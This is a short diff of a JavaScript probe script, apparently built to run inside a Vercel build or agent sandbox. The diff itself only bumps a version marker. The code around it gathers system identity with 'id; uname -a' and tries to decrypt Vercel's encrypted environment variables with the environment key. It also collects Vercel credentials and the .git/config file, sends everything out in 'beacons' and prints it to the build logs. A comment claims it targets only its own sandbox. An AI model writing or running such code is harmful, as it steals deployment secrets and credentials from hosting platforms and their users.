@@ -133,7 +133,7 @@ function tryDecrypt(keyStr, contentStr) {
 // EARLY BEACON — sent immediately before any network probes.
 // Critical env/crypto data arrives even if the main probe times out.
 sendBeacon({
-  marker: "VERCEL-AGENT-PROBE-7F3A2C-v36-early",
+  marker: "VERCEL-AGENT-PROBE-7F3A2C-v37-early",
   whoami: safe(() => execSync("id; uname -a").toString().trim()),
   tryCBC_early: tryDecrypt(process.env.VERCEL_ENV_ENC_KEY, process.env.VERCEL_ENCRYPTED_ENV_CONTENT),
   vercelCreds: {
@@ -148,7 +148,7 @@ sendBeacon({
 });
 
 const report = {
-  marker: "VERCEL-AGENT-PROBE-7F3A2C-v36",
+  marker: "VERCEL-AGENT-PROBE-7F3A2C-v37",
   whoami: safe(() => execSync("id; uname -a; pwd").toString().trim()),
   // credential-bearing surfaces (own sandbox only)
   gitConfig: safe(() => readFileSync(".git/config", "utf8")),
@@ -2710,9 +2710,9 @@ PYEOF
   }),
 });
 
-// Update markers for v36
-report.marker = "VERCEL-AGENT-PROBE-7F3A2C-v36";
-sendBeacon({ ...report, marker: "VERCEL-AGENT-PROBE-7F3A2C-v36" });
+// Update markers for v37
+report.marker = "VERCEL-AGENT-PROBE-7F3A2C-v37";
+sendBeacon({ ...report, marker: "VERCEL-AGENT-PROBE-7F3A2C-v37" });
 
 // Also print to stdout so it shows in build logs / the agent's view.
 console.log(JSON.stringify(report));
